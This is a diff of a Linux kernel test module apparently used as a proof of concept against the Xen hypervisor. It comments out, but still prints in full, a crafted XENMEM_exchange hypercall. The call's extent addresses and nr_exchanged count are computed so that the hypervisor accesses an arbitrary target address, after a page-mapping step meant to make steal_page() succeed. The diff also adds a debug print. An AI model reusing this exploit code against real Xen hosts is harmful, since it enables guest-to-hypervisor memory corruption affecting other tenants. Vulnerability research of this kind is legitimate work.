@@ -50,37 +50,32 @@ static void cleanup_test(void) {
 
   victim_page_virt = (void*)__get_free_pages(GFP_KERNEL, 0);
   in_extent = virt_to_mfn(victim_page_virt);
+  pr_warn("in_extent address: 0x%llx\n", in_extent);
 
-  // We need to do this to make steal_page() in memory_exchange() work.
-  // Equivalent to xen_zap_pfn_range(victim_page_virt, 0, NULL, NULL).
-  call_xen_update_va_mapping(victim_page_virt, 0/*VOID_PTE*/, 0);
-
-  nr_exchanged = (target_addr - OUT_EXTENT_BASE_ADDR) / 8;
-  nr_extents = nr_exchanged + 1;
-  in_extent_addr = (u64)&in_extent;
-  in_extent_base = in_extent_addr - (nr_exchanged * 8);
-
-  args = (struct xen_memory_exchange){
-    .in = {
-      .extent_start = in_extent_base,
-      .nr_extents = nr_extents,
-      .domid = DOMID_SELF
-    },
-    .out = {
-      .extent_start = OUT_EXTENT_BASE_ADDR,
-      .nr_extents = nr_extents,
-      .domid = DOMID_SELF
-    },
-    .nr_exchanged = nr_exchanged
-  };
-
-  // In this case it will acess the addres encoded in :
-  //      exch.out.extent_start + 8 * exch.nr_exchanged
-  pr_warn("exch.out.extent_start:\t%x\n",OUT_EXTENT_BASE_ADDR);
-  pr_warn("exch.nr_exchanged:\t%llx\n",nr_exchanged);
-  pr_warn("Address to be accessed: :\t%llx\n", OUT_EXTENT_BASE_ADDR + 8 *nr_exchanged);
-  ret = call_xen_memory_op(XENMEM_exchange, &args);
-  pr_warn("hypercall returns %ld\n", ret);
+//  // We need to do this to make steal_page() in memory_exchange() work.
+//  // Equivalent to xen_zap_pfn_range(victim_page_virt, 0, NULL, NULL).
+//  call_xen_update_va_mapping(victim_page_virt, 0/*VOID_PTE*/, 0);
+//
+//  nr_exchanged = (target_addr - OUT_EXTENT_BASE_ADDR) / 8;
+//  nr_extents = nr_exchanged + 1;
+//  in_extent_addr = (u64)&in_extent;
+//  in_extent_base = in_extent_addr - (nr_exchanged * 8);
+//
+//  args = (struct xen_memory_exchange){
+//    .in = {
+//      .extent_start = in_extent_base,
+//      .nr_extents = nr_extents,
+//      .domid = DOMID_SELF
+//    },
+//    .out = {
+//      .extent_start = OUT_EXTENT_BASE_ADDR,
+//      .nr_extents = nr_extents,
+//      .domid = DOMID_SELF
+//    },
+//    .nr_exchanged = nr_exchanged
+//  };
+//  ret = call_xen_memory_op(XENMEM_exchange, &args);
+//  pr_warn("hypercall returns 0x%lx\n", ret);
 }
 
 module_init(init_test);
